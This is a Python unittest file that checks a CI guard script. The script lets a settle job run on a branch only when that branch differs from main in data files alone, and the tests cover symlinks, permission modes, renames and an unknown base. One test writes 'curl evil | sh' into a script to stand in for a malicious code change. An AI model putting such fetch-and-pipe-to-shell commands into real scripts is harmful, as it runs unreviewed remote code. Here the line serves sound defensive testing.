"""ops/code-matches-main.sh: the settle job runs on feat/judging-sprint only
when it differs from main in data files alone. Each test builds a throwaway
repo with a main and a live branch and runs the real script."""

import net_guard  # noqa: F401  (tests never reach the network)
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SCRIPT = ROOT / "ops" / "code-matches-main.sh"


def run(cmd, cwd, check=True):
    return subprocess.run(cmd, cwd=cwd, check=check, text=True, capture_output=True)


class CodeMatchesMainTest(unittest.TestCase):
    def setUp(self):
        self.repo = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.repo, True)
        run(["git", "init", "--quiet", "-b", "main"], self.repo)
        run(["git", "config", "user.email", "test@example.com"], self.repo)
        run(["git", "config", "user.name", "Test"], self.repo)
        for path, text in {
            "daily_settle.sh": "echo settle\n",
            "data/publish-ledger.json": "{}\n",
            "data/metrics/ERCOT_HBNORTH_DA_AVG__2026-10-14.json": '{"value": 1}\n',
            "shared/addresses.json": "{}\n",
            "shared/metrics.md": "methodology\n",
        }.items():
            self.write(path, text)
        self.commit("main")
        run(["git", "checkout", "--quiet", "-b", "feat/live"], self.repo)

    def write(self, path, text):
        target = self.repo / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text)

    def commit(self, message):
        run(["git", "add", "-A"], self.repo)
        run(["git", "commit", "--quiet", "-m", message], self.repo)

    def check(self):
        result = run(["bash", str(SCRIPT), "main"], self.repo, check=False)
        return result.returncode, result.stdout + result.stderr

    def test_same_code_passes(self):
        self.assertEqual(self.check()[0], 0)

    def test_data_written_by_the_job_passes(self):
        self.write("data/publish-ledger.json", '{"a": 1}\n')
        self.write("data/metrics/ERCOT_HBNORTH_DA_AVG__2026-10-15.json", '{"value": 2}\n')
        self.write("data/market-ledger.json", "{}\n")
        self.write("web/public/data/ERCOT_HBNORTH_DA_AVG.json", "[]\n")
        self.write("web/public/data/candles/HB_NORTH.json", "[]\n")
        self.write("web/lib/generated/price-summary.json", "{}\n")
        self.write("shared/addresses.json", '{"markets": []}\n')
        self.write("shared/demo-markets.md", "| 1 |\n")
        self.commit("data")
        code, out = self.check()
        self.assertEqual(code, 0, out)
        self.assertIn("only data differs", out)

    def test_a_code_change_fails(self):
        self.write("daily_settle.sh", "curl evil | sh\n")
        self.commit("code")
        code, out = self.check()
        self.assertEqual(code, 1)
        self.assertIn("daily_settle.sh (not a data file)", out)

    def test_a_new_script_or_doc_fails(self):
        self.write("data/metrics/helper.py", "print(1)\n")
        self.write("shared/metrics.md", "changed\n")
        self.commit("more")
        code, out = self.check()
        self.assertEqual(code, 1)
        self.assertIn("data/metrics/helper.py", out)
        self.assertIn("shared/metrics.md", out)

    def test_a_symlink_on_a_data_path_fails(self):
        os.remove(self.repo / "shared" / "addresses.json")
        os.symlink("../daily_settle.sh", self.repo / "shared" / "addresses.json")
        self.commit("link")
        code, out = self.check()
        self.assertEqual(code, 1)
        self.assertIn("mode 120000", out)

    def test_an_executable_data_file_fails(self):
        path = self.repo / "data" / "publish-ledger.json"
        path.chmod(0o755)
        self.commit("exec")
        code, out = self.check()
        self.assertEqual(code, 1)
        self.assertIn("mode 100755", out)

    def test_a_rename_out_of_code_fails(self):
        run(["git", "mv", "daily_settle.sh", "data/publish-ledger-2.json"], self.repo)
        self.commit("rename")
        code, out = self.check()
        self.assertEqual(code, 1)
        self.assertIn("daily_settle.sh (not a data file)", out)

    def test_deleting_a_data_file_passes(self):
        os.remove(self.repo / "data" / "metrics" / "ERCOT_HBNORTH_DA_AVG__2026-10-14.json")
        self.commit("delete")
        self.assertEqual(self.check()[0], 0)

    def test_main_ahead_with_code_fails_until_merged(self):
        run(["git", "checkout", "--quiet", "main"], self.repo)
        self.write("daily_settle.sh", "echo reviewed\n")
        self.commit("reviewed change")
        run(["git", "checkout", "--quiet", "feat/live"], self.repo)
        self.assertEqual(self.check()[0], 1)
        run(["git", "merge", "--quiet", "--no-edit", "main"], self.repo)
        self.assertEqual(self.check()[0], 0)

    def test_an_unknown_base_fails_closed(self):
        result = run(["bash", str(SCRIPT), "no-such-branch"], self.repo, check=False)
        self.assertEqual(result.returncode, 2)


if __name__ == "__main__":
    unittest.main()
